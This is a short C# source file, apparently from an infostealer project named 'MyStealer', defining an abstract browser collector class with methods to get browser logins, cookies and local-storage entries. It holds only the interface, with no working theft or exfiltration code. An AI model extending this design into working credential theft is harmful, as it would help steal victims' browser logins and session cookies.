using System.Collections.Immutable;

namespace MyStealer.Collector.Browser
{
    public abstract class BrowserCollectorBase : ModuleBase
    {
        public abstract IImmutableSet<BrowserLogin> GetLogins();

        public abstract IImmutableSet<BrowserCookie> GetCookies();

        public abstract IImmutableSet<BrowserLocalStorage> GetLocalStorageEntries();
    }
}
